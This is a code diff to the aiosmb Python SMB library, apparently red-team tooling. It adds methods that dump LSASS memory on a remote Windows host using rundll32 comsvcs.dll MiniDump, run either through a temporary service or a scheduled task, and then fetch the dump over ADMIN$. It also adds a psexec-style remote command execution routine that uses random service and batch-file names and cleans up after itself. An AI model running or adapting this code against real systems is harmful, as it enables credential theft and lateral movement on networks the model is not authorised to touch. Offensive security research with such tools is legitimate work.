@@ -17,7 +17,7 @@ from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRP
 from aiosmb.dcerpc.v5.interfaces.rprnmgr import SMBRPRN
 from aiosmb.dcerpc.v5.interfaces.tschmgr import SMBTSCH
 
-from aiosmb.dcerpc.v5 import tsch
+from aiosmb.dcerpc.v5 import tsch, scmr
 
 from aiosmb.commons.utils.decorators import red, rr, red_gen, rr_gen
 from aiosmb.commons.exceptions import SMBMachineException
@@ -514,16 +514,119 @@ class SMBMachine:
 			return None, err
 		res, err = await self.rrp.SaveKey(key_handle, remote_path)
 		return res, err
+	
+	@req_servicemanager
+	async def service_dump_lsass(self, lsass_file_name = None):
+		if lsass_file_name is None:
+			lsass_file_name = os.urandom(4).hex() + '.arj'
+		command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
+		service_name = os.urandom(4).hex()
+		display_name = service_name
+
+		batch_file = os.urandom(4).hex() + '.bat'
+		#totally not from impacket
+		command = '%%COMSPEC%% /Q /c echo %s  2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, batch_file, batch_file, batch_file)
+
+		logger.debug('Service: %s' % service_name)
+		logger.debug('Command: %s' % command)
+		#return None, None
+		try:
+			res, err = await self.servicemanager.create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
+			if err is not None:
+				raise err
+			
+			_, err = await self.start_service(service_name)
+
+			for _ in range(5):
+				await asyncio.sleep(5)
+				temp = SMBFile.from_remotepath(self.connection, '\\ADMIN$\\Temp\\%s' % lsass_file_name)
+				_, err = await temp.open(self.connection)
+				if err is not None:
+					continue
+				return temp, None
+
+			return None, err
+		except Exception as e:
+			return None, e
+		finally:
+			_, err = await self.delete_service(service_name)
+			if err is not None:
+				logger.debug('Failed to delete service!')
+
+	@req_servicemanager_gen
+	async def service_cmd_exec(self, command, display_name = None, service_name = None):
+		"""
+		Creates a service and starts it.
+		Does not create files! there is a separate command for that!
+		"""
+		if service_name is None:
+			service_name = os.urandom(4).hex()
+		if display_name is None:
+			display_name = service_name
+
+		batch_file = os.urandom(4).hex() + '.bat'
+		temp_file_name = os.urandom(4).hex()
+		temp_file_location = '\\ADMIN$\\temp\\%s' % temp_file_name
+		temp_location = '%%windir%%\\temp\\%s' % (temp_file_name)
+
+		#totally not from impacket
+		command = '%%COMSPEC%% /Q /c echo %s  ^>  %s 2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, temp_location, batch_file, batch_file, batch_file)
+
+		logger.debug('Command: %s' % command)
+
+		try:
+			res, err = await self.servicemanager.create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
+			if err is not None:
+				raise err
+			
+			logger.debug('Service created. Name: %s' % service_name)
+			
+			_, err = await self.start_service(service_name)
+			#if err is not None:
+			#	raise err
+
+			await asyncio.sleep(5)
+			logger.debug('Opening temp file. Path: %s' % temp_file_location)
+			temp = SMBFile.from_remotepath(self.connection, temp_file_location)
+			_, err = await temp.open(self.connection)
+			if err is not None:
+				raise err
+			
+			async for data, err in temp.read_chunked():
+				if err is not None:
+					logger.debug('Temp file read failed!')
+					raise err
+				if data is None:
+					break
+
+				yield data, err
+			
+			logger.debug('Deleting temp file...')
+			_, err = await temp.delete()
+			if err is not None:
+				logger.debug('Failed to delete temp file!')
+
+			logger.debug('Deleting service...')
+			_, err = await self.delete_service(service_name)
+			if err is not None:
+				logger.debug('Failed to delete service!')
+			
+			yield None, None
+
+		except Exception as e:
+			yield None, e
+				
+		
 
 	@req_servicemanager
-	async def create_service(self, service_name, command, display_name = None):
+	async def create_service(self, service_name, command, display_name = None, starttype = scmr.SERVICE_AUTO_START):
 		"""
 		Creates a service and starts it.
 		Does not create files! there is a separate command for that!
 		"""
 		if display_name is None:
 			display_name = service_name
-		res, err = await self.servicemanager.create_service(service_name, display_name, command)
+		res, err = await self.servicemanager.create_service(service_name, display_name, command, starttype = starttype)
 		return res, err
 
 	@req_servicemanager
@@ -541,6 +644,14 @@ class SMBMachine:
 		Does not create files! there is a separate command for that!
 		"""
 		return await self.servicemanager.stop_service(service_name)
+	
+	@req_servicemanager
+	async def delete_service(self, service_name):
+		"""
+		Creates a service and starts it.
+		Does not create files! there is a separate command for that!
+		"""
+		return await self.servicemanager.delete_service(service_name)
 
 
 	@req_servicemanager
@@ -587,6 +698,32 @@ class SMBMachine:
 	@req_tsch
 	async def tasks_delete(self, task_name):
 		return await self.tsch.delete_task(task_name)
+
+	
+	@req_tsch
+	async def task_dump_lsass(self, lsass_file_name = None):
+		if lsass_file_name is None:
+			lsass_file_name = os.urandom(4).hex() + '.arj'
+		command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
+
+		logger.debug('Command: %s' % command)
+		#return None, None
+		try:
+			res, err = await self.tasks_execute_commands([command])
+			if err is not None:
+				raise err
+
+			for _ in range(5):
+				await asyncio.sleep(5)
+				temp = SMBFile.from_remotepath(self.connection, '\\ADMIN$\\Temp\\%s' % lsass_file_name)
+				_, err = await temp.open(self.connection)
+				if err is not None:
+					continue
+				return temp, None
+
+			return None, err
+		except Exception as e:
+			return None, e
 
 	@req_rprn
 	async def printerbug(self, attacker_host):
